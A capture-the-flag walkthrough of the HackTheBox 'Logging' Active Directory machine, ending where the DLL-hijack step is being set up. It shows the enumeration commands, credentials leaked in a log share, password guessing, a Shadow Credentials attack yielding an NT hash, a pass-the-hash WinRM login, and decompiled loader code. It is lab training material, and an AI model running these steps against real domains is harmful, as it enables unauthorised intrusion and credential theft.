---
title: Logging
date: 2026-07-07
excerpt: HackTheBox - Medium
cover: ../uploads/cover_logging.jpg
tags: DLL Hijacking, ADCS Exploitation, WSUS Server Impersonation
---

Welcome back to another Hack The Box writeup. In this walkthrough, we will be tackling **Logging**, a Medium-difficulty Active Directory machine that combines Windows enumeration, privilege escalation, and domain exploitation techniques.

This machine provides an excellent opportunity to practice identifying attack paths within an Active Directory environment, understanding common misconfigurations, and leveraging them to gain higher levels of access. Throughout this writeup, I will cover the enumeration process, the methodology used to uncover vulnerabilities, and the steps required to achieve full compromise of the target.

By the end of this challenge, we will have explored several real-world attack techniques that are frequently encountered during penetration tests and security assessments, making Logging a valuable learning experience for anyone looking to strengthen their Active Directory exploitation skills.

We will start by scanning the open ports of the target using `nmap`:

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ nmap -A -T5 10.129.245.130
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-07 08:52 -0400
Stats: 0:00:43 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 92.31% done; ETC: 08:53 (0:00:03 remaining)
Nmap scan report for 10.129.245.130
Host is up (0.068s latency).
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-07 19:52:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-07T19:53:37+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-07T19:53:37+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
|_ssl-date: 2026-07-07T19:53:37+00:00; +6h59m55s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-07T19:53:37+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m54s, deviation: 0s, median: 6h59m54s
| smb2-time: 
|   date: 2026-07-07T19:53:27
|_  start_date: N/A

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   90.07 ms 10.10.14.1
2   90.08 ms 10.129.245.130

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.89 seconds
```

The target domain is **DC01.logging.htb**, so the first step is to add the necessary entry to the `/etc/hosts` file to ensure proper name resolution during our assessment.

At this stage, we have already been provided with a valid set of credentials. As is often the case in real-world penetration testing engagements, initial access information is supplied to simulate an authenticated user within the environment.

## Machine Information

We are given the following domain credentials:

**Username:** wallace.everette
**Password:** Welcome2026@

These credentials will serve as our starting point for enumeration and further exploration of the Active Directory environment.

Using the provided credentials, I performed SMB enumeration with NetExec's `spider_plus` module to identify accessible shares and gather metadata about files stored on the server. The authentication was successful, confirming that the account `wallace.everette` has valid domain access. The target was identified as a Windows Server 2019 Domain Controller (`DC01.logging.htb`) with SMB signing enabled and SMBv1 disabled, indicating a relatively modern and hardened configuration.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ nxc smb logging.htb -u 'wallace.everette' -p 'Welcome2026@' -M spider_plus                               
SMB         10.129.245.130  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False) 
SMB         10.129.245.130  445    DC01             [+] logging.htb\wallace.everette:Welcome2026@ 
SPIDER_PLUS 10.129.245.130  445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.245.130  445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.245.130  445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.245.130  445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.245.130  445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.245.130  445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.245.130  445    DC01             [*]  OUTPUT_FOLDER: /home/blxckwolf/.nxc/modules/nxc_spider_plus
SMB         10.129.245.130  445    DC01             [*] Enumerated shares
SMB         10.129.245.130  445    DC01             Share           Permissions     Remark
SMB         10.129.245.130  445    DC01             -----           -----------     ------
SMB         10.129.245.130  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.245.130  445    DC01             C$                              Default share
SMB         10.129.245.130  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.245.130  445    DC01             Logs            READ            
SMB         10.129.245.130  445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.245.130  445    DC01             SYSVOL          READ            Logon server share 
SMB         10.129.245.130  445    DC01             WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
SPIDER_PLUS 10.129.245.130  445    DC01             [+] Saved share-file metadata to "/home/blxckwolf/.nxc/modules/nxc_spider_plus/10.129.245.130.json".                                                                                
SPIDER_PLUS 10.129.245.130  445    DC01             [*] SMB Shares:           7 (ADMIN$, C$, IPC$, Logs, NETLOGON, SYSVOL, WSUSTemp)                                                                                                    
SPIDER_PLUS 10.129.245.130  445    DC01             [*] SMB Readable Shares:  4 (IPC$, Logs, NETLOGON, SYSVOL)      
SPIDER_PLUS 10.129.245.130  445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.245.130  445    DC01             [*] Total folders found:  28
SPIDER_PLUS 10.129.245.130  445    DC01             [*] Total files found:    13
SPIDER_PLUS 10.129.245.130  445    DC01             [*] File size average:    1.59 KB
SPIDER_PLUS 10.129.245.130  445    DC01             [*] File size min:        22 B
SPIDER_PLUS 10.129.245.130  445    DC01             [*] File size max:        8.29 KB
```

The enumeration revealed several SMB shares, including the standard `NETLOGON`, `SYSVOL`, and `IPC$` shares, as well as a custom share named `Logs`. The user had read access to `Logs`, `NETLOGON`, `SYSVOL`, and `IPC$`, making them valuable targets for further investigation. Since custom shares often contain sensitive information such as configuration files, credentials, or operational logs, the `Logs` share stood out as the most interesting finding and became the primary focus for the next stage of enumeration.

Reviewing the output generated by `spider_plus`, we can see that the custom `Logs` share contains only a handful of log files. While log files are often overlooked during enumeration, they can reveal valuable information such as usernames, service accounts, internal hostnames, application errors, configuration details, or even credentials accidentally written to disk. Since the standard `NETLOGON` and `SYSVOL` shares did not contain any immediately interesting files, the `Logs` share became the most promising avenue for further investigation.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ cat /home/blxckwolf/.nxc/modules/nxc_spider_plus/10.129.245.130.json              
{
    "Logs": {
        "Audit_Heartbeat.log": {
            "atime_epoch": "2026-04-16 19:10:09",
            "ctime_epoch": "2026-04-16 19:10:09",
            "mtime_epoch": "2026-04-16 19:10:09",
            "size": "1.26 KB"
        },
        "IdentitySync_Trace_20260219.log": {
            "atime_epoch": "2026-04-16 19:10:09",
            "ctime_epoch": "2026-04-16 19:10:09",
            "mtime_epoch": "2026-04-16 19:10:09",
            "size": "8.29 KB"
        },
        "Service_State.log": {
            "atime_epoch": "2026-04-16 19:10:09",
            "ctime_epoch": "2026-04-16 19:10:09",
            "mtime_epoch": "2026-04-16 19:10:09",
            "size": "468 B"
        },
        "TaskMonitor.log": {
            "atime_epoch": "2026-04-16 19:10:09",
            "ctime_epoch": "2026-04-16 19:10:09",
            "mtime_epoch": "2026-04-24 12:59:43",
            "size": "1.14 KB"
        }
    },
```

The metadata shows four log files of varying sizes, with `IdentitySync_Trace_20260219.log` being the largest and therefore the most likely to contain useful information. Rather than making assumptions based solely on filenames, the next step is to download these files and manually inspect their contents for sensitive data, misconfigurations, or clues that could help us progress further into the environment.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging/Log]
└─$ smbclient //logging.htb/Logs -U 'LOGGING/wallace.everette%Welcome2026@' -c 'recurse ON; prompt OFF; mget *'

getting file \Audit_Heartbeat.log of size 1294 as Audit_Heartbeat.log (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)
getting file \IdentitySync_Trace_20260219.log of size 8488 as IdentitySync_Trace_20260219.log (26.1 KiloBytes/sec) (average 15.4 KiloBytes/sec)
getting file \Service_State.log of size 468 as Service_State.log (1.7 KiloBytes/sec) (average 11.3 KiloBytes/sec)
getting file \TaskMonitor.log of size 1170 as TaskMonitor.log (4.1 KiloBytes/sec) (average 9.6 KiloBytes/sec)
```

## Initial Foothold via Exposed Service Account Credentials

Upon inspecting the contents of `IdentitySync_Trace_20260219.log`, a critical piece of information was discovered. The log file contains a verbose LDAP connection dump generated by an identity synchronization service, which inadvertently exposes the credentials used by the application to authenticate against Active Directory. It is not uncommon to encounter sensitive information within application logs due to excessive debugging or improper logging practices.

```text
[2026-02-09 03:00:03.055] [PID:4102] [Thread:04] INFO  - Validating AD target health: DC01.logging.htb (Port 389)
[2026-02-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Initializing LdapConnection object...
[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }
[2026-02-19 03:00:03.488] [PID:4102] [Thread:04] ERROR - System.DirectoryServices.Protocols.LdapException: A local error occurred.
   at System.DirectoryServices.Protocols.LdapConnection.Bind(NetworkCredential credential)
   at logging.IdentitySync.Engine.LdapProvider.Connect()
   --- Server Error Details ---
   Server error: 8009030C: LdapErr: DSID-0C090569, comment: AcceptSecurityContext error, data 52e, v4563
   Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
   Win32 Error: 49 (Invalid Credentials)
   ----------------------------
[2026-02-19 03:00:03.510] [PID:4102] [Thread:12] WARN  - Connectivity failed for logging\svc_recovery. Checking alternate Domain Controller...
```

Among the logged parameters, the service account `svc_recovery` and its password `Em3rg3ncyPa$$2025` were clearly visible. Although the subsequent LDAP authentication attempt failed, the credentials themselves were still recorded in plaintext within the log file. This provides us with a new set of domain credentials that may possess different privileges than our initial user account and are therefore worth validating during the next stage of enumeration.

**Credentials Obtained:**

* **Username:** `svc_recovery`
* **Password:** `Em3rg3ncyPa$$2025`

To validate the newly discovered credentials, I attempted to authenticate to SMB using the `svc_recovery` account. Although the username and password appeared legitimate, the authentication attempt returned a `STATUS_ACCOUNT_RESTRICTION` error. This typically indicates that the account is subject to logon restrictions, such as being limited to specific authentication methods, hosts, or services. Since the credentials could not be used through SMB, further investigation was required to determine whether the account was still valid.

Given the possibility that the account was intended for Kerberos-based authentication, I generated a Kerberos configuration file, synchronized my system clock with the domain controller, and requested a Ticket Granting Ticket (TGT) using Impacket's `impacket-getTGT`. Time synchronization is a critical prerequisite for Kerberos, as significant clock skew can cause authentication failures. However, the request returned `KDC_ERR_PREAUTH_FAILED`, which indicates that the provided password was not accepted by the Key Distribution Center (KDC). This suggested that the credentials stored in the log file were likely outdated, prompting the need to search for alternative attack paths or recover a more recent password for the service account.

Revisiting the log file revealed an important detail. The entry containing the password `Em3rg3ncyPa$$2025` was logged on February 9, while later entries from February 19 reported `LDAP_INVALID_CREDENTIALS` and failed authentication attempts for the same service account. This strongly suggested that the password had been changed sometime between those dates, rendering the previously exposed credentials obsolete.

A common pattern in enterprise environments is the use of predictable password rotations, especially for service accounts. Given the naming convention of the leaked password, I hypothesized that only the year component had been updated and tested `Em3rg3ncyPa$$2026` instead.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ impacket-getTGT 'LOGGING.HTB/svc_recovery:Em3rg3ncyPa$$2026'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

The `KRB_AP_ERR_SKEW (Clock skew too great)` error occurs because the time on the attacking machine differs significantly from the Domain Controller's time, causing Kerberos authentication to reject the request as a security measure.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ sudo ntpdate -u logging.htb                                 
2026-07-07 16:02:56.883769 (-0400) +25214.323059 +/- 0.033063 logging.htb 10.129.245.130 s1 no-leap
CLOCK: time stepped by 25214.323059
```

Running `ntpdate` synchronizes the attacker's system clock with the Domain Controller, eliminating the time difference and allowing Kerberos to validate and issue tickets successfully.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ impacket-getTGT 'LOGGING.HTB/svc_recovery:Em3rg3ncyPa$$2026'
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in svc_recovery.ccache
```

This proved successful, as `impacket-getTGT` was able to obtain a valid Kerberos Ticket Granting Ticket (TGT) for `svc_recovery`. The successful ticket issuance confirmed that the updated password was correct, granting us control over the service account and providing a new foothold for further domain enumeration and privilege escalation.

To gain a better understanding of the Active Directory environment and identify potential attack paths, I collected domain information using `BloodHound`. This allows us to map relationships between users, groups, computers, and permissions, making it easier to uncover privilege escalation opportunities that may not be immediately obvious through manual enumeration.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging/Log]
└─$ bloodhound-python -dc 'DC01.logging.htb' -d 'logging.htb' -u 'wallace.everette' -p 'Welcome2026@' -ns 10.129.245.130 --zip -c All 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: logging.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: DC01.logging.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: DC01.logging.htb
INFO: Found 14 users
INFO: Found 57 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.logging.htb
INFO: Done in 00M 22S
INFO: Compressing output into 20260707090525_bloodhound.zip
```

Using the credentials for `wallace.everette`, BloodHound successfully gathered data from the domain, including users, groups, Group Policy Objects (GPOs), organizational units, and other Active Directory objects. The collected data was exported into a ZIP file, which can then be imported into BloodHound for graphical analysis and further investigation of the domain's trust relationships and access control structure.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FVgGaTuQnFV3ptxVtK1oG%252FScreenshot%2520%282889%29.png%3Falt%3Dmedia%26token%3D242d22a5-50e6-49f4-a5bd-8194081e724d&width=768&dpr=3&quality=100&sign=c9f9b477&sv=2)

## Privilege Escalation to MSA\_HEALTH$ via Shadow Credentials

BloodHound revealed that the `svc_recovery` account has **GenericWrite** privileges over the `MSA_HEALTH$` account. This permission allows `svc_recovery` to modify certain attributes of the target account, effectively giving us control over it. Since `GenericWrite` is a powerful Active Directory permission that can often be abused for privilege escalation, `MSA_HEALTH$` became the next target for further enumeration and exploitation.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FCJx8UKOkEUhKCGwRWPhZ%252FScreenshot%2520%282883%29.png%3Falt%3Dmedia%26token%3D7929b709-6fa3-4342-b669-66e22a3e1c54&width=768&dpr=3&quality=100&sign=47a01be5&sv=2)

BloodHound also showed that `MSA_HEALTH$` is a member of the **Remote Management Users** group, which is a strong indicator that the account may be permitted to access the target through WinRM. Gaining control of this account would therefore provide a potential path to interactive access on the host.

To take advantage of the **GenericWrite** permission held by `svc_recovery`, I performed a Shadow Credentials attack against `MSA_HEALTH$`. This technique abuses the `msDS-KeyCredentialLink` attribute by registering a new key credential on the target account, allowing us to authenticate as `MSA_HEALTH$` without knowing its password. `BloodyAD` simplify this process through the `add shadowCredentials` command, which automates the creation and registration of the malicious key credential needed for certificate-based authentication.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ export KRB5CCNAME=svc_recovery.ccache  

┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ bloodyad -H dc01.logging.htb -d logging.htb -u 'svc_recovery' -k add shadowCredentials 'MSA_HEALTH$'
[+] KeyCredential generated with following sha256 of RSA key: a351a6b4997d6d0855946d76d04eec64b9ac3eb408c69accba92e7f2ec187eb8
[+] TGT stored in ccache file msa_health_on.ccache

NT: 603fc24ee01a9409f83c9d1d701485c5
```

With control over the `MSA_HEALTH$` account, I authenticated to the target via WinRM using `Evil-WinRM` and successfully obtained an interactive PowerShell session.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging]
└─$ evil-winrm -i dc01.logging.htb -u 'msa_health$' -H 603fc24ee01a9409f83c9d1d701485c5
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\msa_health$\Documents>
```

Having established a foothold on the system, the next step was to enumerate the account's privileges, group memberships, and accessible resources. This is an important phase of post-exploitation, as service accounts are often granted permissions that can be leveraged for privilege escalation or lateral movement within the Active Directory environment.

```powershell
*Evil-WinRM* PS C:\Users\msa_health$\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Enumerating the account's privileges revealed that `MSA_HEALTH$` possesses `SeMachineAccountPrivilege`, which allows the account to join new computer objects to the domain. By default, this privilege enables authenticated users to add a limited number of machines, but in certain attack scenarios it can be abused to create a controlled computer account and leverage it for further Active Directory exploitation. The remaining privileges, `SeChangeNotifyPrivilege` and `SeIncreaseWorkingSetPrivilege`, are common permissions that generally do not provide a direct path to privilege escalation on their own.

```powershell
*Evil-WinRM* PS C:\Users\jaylee.clifton> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
logging\Domain Computers                    Group            S-1-5-21-4020823815-2796529489-1682170552-515 Mandatory group, Enabled by default, Enabled group
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

Enumerating the group memberships of `MSA_HEALTH$` provides additional insight into the level of access granted to the account within the domain. The most notable group is **Remote Management Users**, which explains why WinRM access was possible and confirms that the account is authorized to establish remote management sessions on the host. The account is also a member of **Domain Computers**, indicating that it is treated as a computer object within Active Directory rather than a standard user account.

After obtaining access as `MSA_HEALTH$`, I continued enumerating the system and inspected the `C:\Users` directory to identify other user profiles present on the host. In addition to the built-in `Administrator` account and our current service account, two interesting user profiles were discovered: `jaylee.clifton` and `toby.brynleigh`. User profile directories often indicate accounts that have logged onto the system previously and can provide valuable leads for further enumeration, credential hunting, or privilege escalation opportunities.

```powershell
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/16/2026   5:27 PM                .NET v4.5
d-----        4/16/2026   5:27 PM                .NET v4.5 Classic
d-----        4/16/2026   8:30 PM                Administrator
d-----        4/16/2026   4:41 PM                jaylee.clifton
d-----        4/17/2026   8:33 AM                msa_health$
d-r---        4/10/2020  10:49 AM                Public
d-----        4/17/2026   1:47 PM                toby.brynleigh
```

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FcDNlMdeFJvBaxwEfEXTG%252FScreenshot%2520%282884%29.png%3Falt%3Dmedia%26token%3Df92260c4-ef01-4fee-baaf-2655f5c28711&width=768&dpr=3&quality=100&sign=1c9d6f3&sv=2)

Referring back to the BloodHound data, `toby.brynleigh` immediately stood out as a high-value target. The graph shows that both `Administrator` and `toby.brynleigh` are direct members of the **Domain Admins** group, meaning either account would provide full administrative control over the domain.

![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FPIHh4cmfzJ3BvEWIXnqY%252FScreenshot%2520%282885%29.png%3Falt%3Dmedia%26token%3Dcdf795cf-0554-45bb-90b5-f41040c7a0c6&width=768&dpr=3&quality=100&sign=85865167&sv=2)

In contrast, `jaylee.clifton` is only a member of standard groups such as **Domain Users**, **IT**, and **Performance Log Users**, none of which grant elevated privileges. Since `toby.brynleigh` possesses Domain Admin privileges and has an existing profile on the machine, the focus of the enumeration shifted toward identifying a path to compromise this account and ultimately achieve domain administrator access.

## Lateral Movement to jaylee.clifton via DLL Hijacking

Reviewing `TaskMonitor.log` revealed repeated health-check entries for a process named **UpdateChecker Agent**. While the log itself does not expose any credentials or sensitive information, it does provide valuable insight into the applications running on the system. The consistent execution of this task suggests that it is an actively monitored service or scheduled process, making it an interesting target for further investigation.

```shell
┌──(blxckwolf㉿shinku)-[~/HTB/Logging/Log]
└─$ cat TaskMonitor.log  
[2026-02-20 09:56:48] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-20 09:56:56] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-20 09:57:24] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-20 10:01:12] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-20 10:02:44] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-20 10:07:47] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-20 10:15:12] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-22 01:44:37] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-22 01:50:11] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-22 01:54:18] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-22 02:10:04] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-22 02:21:46] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
[2026-02-22 02:55:28] INFO  - Task [UpdateChecker Agent] health check: OK (State: Ready)
```

To gather additional information about the host, I uploaded and executed `WinPEAS` for local enumeration. Among the findings was a custom application named **UpdateMonitor.exe**, which appeared to be related to the `UpdateChecker Agent` referenced in the log file. Since custom applications and scheduled tasks are common sources of privilege escalation opportunities, this discovery warranted closer inspection to determine how the program operates, what account executes it, and whether it could be abused to gain access to a more privileged user.

WinPEAS revealed that the custom application was installed under `C:\Program Files\UpdateMonitor`. To determine whether the application could be abused for privilege escalation, I examined its Access Control Lists (ACLs) using `icacls`. The results showed that the **IT** group possesses **Full Control (F)** over both the application directory and the `UpdateMonitor.exe` binary itself. This is a significant finding, as members of the IT group can modify, replace, or tamper with the executable, potentially leading to code execution in the context of whatever account runs the application.

```powershell
*Evil-WinRM* PS C:\Users> icacls "C:\Program Files\UpdateMonitor"
 
C:\Program Files\UpdateMonitor logging\IT:(OI)(CI)(F)
                               NT SERVICE\TrustedInstaller:(I)(F)
                               NT SERVICE\TrustedInstaller:(I)(CI)(IO)(F)
                               NT AUTHORITY\SYSTEM:(I)(F)
                               NT AUTHORITY\SYSTEM:(I)(OI)(CI)(IO)(F)
                               BUILTIN\Administrators:(I)(F)
                               BUILTIN\Administrators:(I)(OI)(CI)(IO)(F)
                               BUILTIN\Users:(I)(RX)
                               BUILTIN\Users:(I)(OI)(CI)(IO)(GR,GE)
                               CREATOR OWNER:(I)(OI)(CI)(IO)(F)
                               APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
                               APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
                               APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
*Evil-WinRM* PS C:\Users> icacls "C:\Program Files\UpdateMonitor\UpdateMonitor.exe"
C:\Program Files\UpdateMonitor\UpdateMonitor.exe logging\IT:(I)(F)
                                                 NT AUTHORITY\SYSTEM:(I)(F)
                                                 BUILTIN\Administrators:(I)(F)
                                                 BUILTIN\Users:(I)(RX)
                                                 APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                 APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

However, this attack path was not immediately exploitable because the compromised `MSA_HEALTH$` account is not a member of the **IT** group. Referring back to the BloodHound data, the most notable member of that group is `jaylee.clifton`, meaning the permissions are currently outside of our control. While we cannot directly overwrite the executable at this stage, the discovery is still valuable because it establishes a trust relationship between the application and the IT group. As a result, the focus shifted toward understanding how `UpdateMonitor.exe` operates and whether its functionality could be leveraged to interact with or compromise `jaylee.clifton`, ultimately granting us access to the permissions required to abuse the application.

To better understand the behavior of the application, I downloaded `UpdateMonitor.exe` and analyzed it with `DotPeek`. During the review of the decompiled code, several functions stood out, particularly `LoadLibrary` and `GetProcAddress`, as these are commonly used to dynamically load external DLLs at runtime. Tracing the execution flow revealed that the program checks for the presence of a file named `Settings_Update.zip` in `C:\ProgramData\UpdateMonitor\`. If the archive exists, it is automatically extracted into the application's installation directory before a DLL named `settings_update.dll` is loaded and the exported function `PreUpdateCheck` is executed.

```C#
string zipPath = @"C:\ProgramData\UpdateMonitor\Settings_Update.zip";
string installDirectory = @"C:\Program Files\UpdateMonitor\bin\";
string dllName = "settings_update.dll";
string dllPath = Path.Combine(installDirectory, dllName);

if (File.Exists(zipPath))
{
    if (File.Exists(dllPath))
        File.Delete(dllPath);

    ZipFile.ExtractToDirectory(zipPath, installDirectory);
}

IntPtr moduleHandle = Program.LoadLibrary(dllPath);
IntPtr preUpdateCheck = Program.GetProcAddress(moduleHandle, "PreUpdateCheck");
```

